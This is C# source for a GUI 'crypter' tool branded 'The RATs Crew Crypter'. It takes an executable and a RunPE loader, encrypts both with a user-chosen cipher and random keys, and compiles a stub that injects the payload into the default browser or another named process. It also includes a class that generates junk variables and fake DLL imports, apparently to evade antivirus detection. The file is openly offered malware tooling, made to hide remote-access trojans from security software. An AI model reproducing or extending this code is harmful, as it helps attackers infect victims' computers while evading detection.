﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Security.Cryptography;
using System.IO;
using System.Resources;

namespace The_RATs_Crew_Crypter
{
    public partial class frmTRC_Crypter : Form
    {
        public frmTRC_Crypter()
        {
            InitializeComponent();
        }
        Random r = new Random();

        private void btnEncryptedFileSearch_Click(object sender, EventArgs e)
        {
            OpenFileDialog d = new OpenFileDialog();
            if (d.ShowDialog() == DialogResult.OK) txtFile.Text = d.FileName;
        }
        private void btnSelectIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog d = new OpenFileDialog();
            d.Filter = "Icon (*.ico) |*.ico";
            if (d.ShowDialog() == DialogResult.OK) txtIcon.Text = d.FileName;
        }
        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            CompilerParameters p = new CompilerParameters()
            {
                GenerateExecutable = true,
                TreatWarningsAsErrors = false,
                CompilerOptions = "/t:winexe",
                IncludeDebugInformation = false
            };
            if (txtIcon.Text != "") p.CompilerOptions += " /win32icon:\"" + txtIcon.Text + "\"";
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Executable (*.exe) |*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                p.OutputAssembly = sfd.FileName;
                p.ReferencedAssemblies.Add("System.dll");

                string s = Properties.Resources.Source;

                byte[] b = File.ReadAllBytes(txtFile.Text);
                byte[] runPE = null;
                string EncryptionString = "";
                string EncryptionRunPE = "";


                if (rdbRunPE0.Checked)
                {
                    runPE = Properties.Resources.RunPE0;
                    s = s.Replace("[TYPE-NUMBER]", "7");
                    s = s.Replace("[METHOD-NAME]", "MakeIt");
                }
                else if (rdbRunPE1.Checked)
                {
                    runPE = Properties.Resources.RunPE1;
                    s = s.Replace("[TYPE-NUMBER]", "0");
                    s = s.Replace("[METHOD-NAME]", "Run");
                }
                else if (rdbRunPE2.Checked)
                {
                    runPE = Properties.Resources.RunPE2;
                    s = s.Replace("[TYPE-NUMBER]", "5");
                    s = s.Replace("[METHOD-NAME]", "TmVQndIrQHbRoJsWMbhRh");
                }
                else //RunPE3 checked
                {
                    runPE = Properties.Resources.RunPE3;
                     s = s.Replace("[TYPE-NUMBER]", "0");
                     s = s.Replace("[METHOD-NAME]", "Run");
                }



                if (rdbDES.Checked)
                {
                    EncryptionString = RndString(8);
                    EncryptionRunPE = RndString(8);
                    b = Encryption.DESEncrypt(b, EncryptionString);
                    runPE = Encryption.DESEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.DESDecrypt);
                }
                else if (rdbRC2.Checked)
                {
                    EncryptionString = RndString(8);
                    EncryptionRunPE = RndString(8);
                    b = Encryption.RC2Encrypt(b, EncryptionString);
                    runPE = Encryption.RC2Encrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.RC2Decrypt);
                }
                else if (rdbRC4.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.RC4EncryptDecrypt(b, EncryptionString);
                    runPE = Encryption.RC4EncryptDecrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.RC4EncryptDecrypt);
                }
                else if (rdbRijndael.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.RijndaelEncrypt(b, EncryptionString);
                    runPE = Encryption.RijndaelEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.RijndaelDecrypt);
                }
                else if (rdbSymentric.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.SymetricEncrypt(b, EncryptionString);
                    runPE = Encryption.SymetricEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.SymentricDecrypt);
                }
                else if (rdbTripleDES.Checked)
                {
                    EncryptionString = RndString(24);
                    EncryptionRunPE = RndString(24);
                    b = Encryption.TripleDESEncrypt(b, EncryptionString);
                    runPE = Encryption.TripleDESEncrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.TripleDESDecrypt);
                }
                else if (rdbXOR.Checked)
                {
                    EncryptionString = RndString(16);
                    EncryptionRunPE = RndString(16);
                    b = Encryption.XOREncryptDecrypt(b, EncryptionString);
                    runPE = Encryption.XOREncryptDecrypt(runPE, EncryptionRunPE);
                    s = s.Replace("[ENCRYPTION]", Properties.Resources.XOREncryptDecrypt);
                }








                ResourceWriter w = new ResourceWriter(Application.StartupPath + "\\shank.resources");
                w.AddResource("cheese", b);
                w.AddResource("runPE", runPE);
                w.Close();
                p.EmbeddedResources.Add(Application.StartupPath + "\\shank.resources");

                s = s.Replace("{KEY}", EncryptionString);
                s = s.Replace("{RUNPEKEY}", EncryptionRunPE);

                if (rdbDefaultBrowser.Checked)
                {
                    s = s.Replace("[INJECT-INTO]", "DefaultBrowser()");
                    s = s.Replace("[DEFAULT-BROWSER]", Properties.Resources.DefaultBrowser);
                }
                else
                {
                    s = s.Replace("[INJECT-INTO]", "\"" + txtInjectInto.Text + "\"");
                    s = s.Replace("[DEFAULT-BROWSER]", "");
                }

                CompilerResults r = new CSharpCodeProvider().CompileAssemblyFromSource(p, s);

                File.Delete(Application.StartupPath + "\\shank.resources");

                if (r.Errors.Count > 0) MessageBox.Show("There went something wrong! Contact CaptainBri for help."); //foreach (CompilerError er in r.Errors) MessageBox.Show(er.ToString());
                else MessageBox.Show("Succesfully crypted! RATs Crew forever ^^");
            }
        }
        private string RndString(int HowMany)
        {
            string all = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
            string returnme = "";
            for (int i = 0; i < HowMany; i++) returnme += all[r.Next(0, all.Length)];
            return returnme;
        }
    }

    public class Encryption
    {
        public static byte[] AESEncrypt(byte[] input, string Key)
        {
            PasswordDeriveBytes pdb =
            new PasswordDeriveBytes(Key, new byte[] { 0x43, 0x87, 0x23, 0x72 });
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }
        public static byte[] DESEncrypt(byte[] bytes, string Key)
        {
            byte[] inputArray = bytes;
            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            DES.Key = UTF8Encoding.UTF8.GetBytes(Key);
            DES.Mode = CipherMode.ECB;
            DES.Padding = PaddingMode.PKCS7;
            ICryptoTransform cTransform = DES.CreateEncryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
            DES.Clear();
            return resultArray;
        }
        public static byte[] TripleDESEncrypt(byte[] bytes, string Key)
        {
            byte[] inputArray = bytes;
            TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();
            tripleDES.Key = UTF8Encoding.UTF8.GetBytes(Key);
            tripleDES.Mode = CipherMode.ECB;
            tripleDES.Padding = PaddingMode.PKCS7;
            ICryptoTransform cTransform = tripleDES.CreateEncryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
            tripleDES.Clear();
            return resultArray;
        }
        public static byte[] RijndaelEncrypt(byte[] bytes, string Key)
        {
            MemoryStream memoryStream;
            CryptoStream cryptoStream;
            Rijndael rijndael = Rijndael.Create();
            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(Key,
            new byte[] { 0x26, 0xdc, 0xff, 0x00, 0xad, 0xed, 0x7a, 0xee, 0xc5, 0xfe, 0x07, 0xaf, 0x4d, 0x08, 0x22, 0x3c });
            rijndael.Key = pdb.GetBytes(32);
            rijndael.IV = pdb.GetBytes(16);
            memoryStream = new MemoryStream();
            cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(bytes, 0, bytes.Length);
            cryptoStream.Close();
            return memoryStream.ToArray();
        }
        public static byte[] RC4EncryptDecrypt(byte[] bytes, string Key)
        {
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            byte[] s = new byte[256];
            byte[] k = new byte[256];
            byte temp;
            int i, j;

            for (i = 0; i < 256; i++)
            {
                s[i] = (byte)i;
                k[i] = key[i % key.GetLength(0)];
            }

            j = 0;
            for (i = 0; i < 256; i++)
            {
                j = (j + s[i] + k[i]) % 256;
                temp = s[i];
                s[i] = s[j];
                s[j] = temp;
            }

            i = j = 0;
            for (int x = 0; x < bytes.GetLength(0); x++)
            {
                i = (i + 1) % 256;
                j = (j + s[i]) % 256;
                temp = s[i];
                s[i] = s[j];
                s[j] = temp;
                int t = (s[i] + s[j]) % 256;
                bytes[x] ^= s[t];
            }
            return bytes;
        }
        public static byte[] XOREncryptDecrypt(byte[] bytes, string Key)
        {
            int amount = 350;
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= (byte)(key[i % key.Length] >> (i + amount + key.Length) & 255);
            return bytes;
        }
        public static byte[] SymetricEncrypt(byte[] bytes, string Key)
        {
            SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
            MemoryStream ms = new MemoryStream();
            byte[] key = Encoding.ASCII.GetBytes(Key);
            byte[] rgbIV = key;
            CryptoStream cs = new CryptoStream(ms, rijn.CreateEncryptor(key, rgbIV), CryptoStreamMode.Write);
            cs.Write(bytes, 0, bytes.Length);
            cs.Close();
            return ms.ToArray();
        }
        public static byte[] RC2Encrypt(byte[] bytes, string Key)
        {
            byte[] byteKey = Encoding.ASCII.GetBytes(Key);
            byte[] byteIV = byteKey;
            MemoryStream MS = new MemoryStream();
            RC2CryptoServiceProvider CryptoMethod = new RC2CryptoServiceProvider();
            CryptoStream CS = new CryptoStream(MS, CryptoMethod.CreateEncryptor(byteKey, byteIV), CryptoStreamMode.Write);
            CS.Write(bytes, 0, bytes.Length);
            CS.FlushFinalBlock();
            return MS.ToArray();
        }
    }

    public class Junk
    {
        private string GenerateJunk(int HowMany, bool Arrays)
        {
            string[] Options = {"string", "int", "long", "double", "decimal", "IntPtr", "StringComparer", "Array", "Attribute", "bool",
                                   "byte", "char", "Boolean"};
            if (Arrays)
            {
                Options = new string[]{ "string", "int", "long", "double", "decimal", "IntPtr", "string[]", "int[]",
                "long[]", "double[]", "decimal[]", "IntPtr[]", "StringComparer", "Array", "Attribute", 
                "bool", "bool[]", "byte", "byte[]", "char", "char[]", "Boolean", "Boolean[]"};
            }

            string ToReturn = "";
            for (int i = 0; i < HowMany; i++)
            {
                ToReturn += Options[r.Next(0, Options.Length)] + " " + RndString(30) + ";\r\n";
            }
            return ToReturn;
        }
        private string GenerateAPIs(int HowMany, int Length)
        {
            string[] Options = { "string", "int", "long", "double", "decimal", "IntPtr", "string[]", "int[]", "long[]", "double[]", "decimal[]", "IntPtr[]",
                                          "StringComparer", "Array", "Attribute", "bool", "bool[]", "byte", "byte[]", "char", "char[]", "Boolean", "Boolean[]"};

            string API = "[DllImport(\"[DLL].dll\")] static extern [TYPE] [NAME]([PARAM1], [PARAM2]);";
            string ToReturn = "";
            for (int i = 0; i < HowMany; i++)
            {
                string OneDLL = API;
                OneDLL = OneDLL.Replace("[DLL]", RndString(Length));
                OneDLL = OneDLL.Replace("[TYPE]", Options[r.Next(0, Options.Length)]);
                OneDLL = OneDLL.Replace("[NAME]", RndString(Length));
                OneDLL = OneDLL.Replace("[PARAM1]", Options[r.Next(0, Options.Length)] + " " + RndString(Length));
                OneDLL = OneDLL.Replace("[PARAM2]", Options[r.Next(0, Options.Length)] + " " + RndString(Length));
                ToReturn += OneDLL + "\r\n";
            }
            return ToReturn;
        }
        private string RndString(int HowMany)
        {
            string all = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
            string returnme = "";
            for (int i = 0; i < HowMany; i++) returnme += all[r.Next(0, all.Length)];
            return returnme;
        }
        Random r = new Random();
    }
}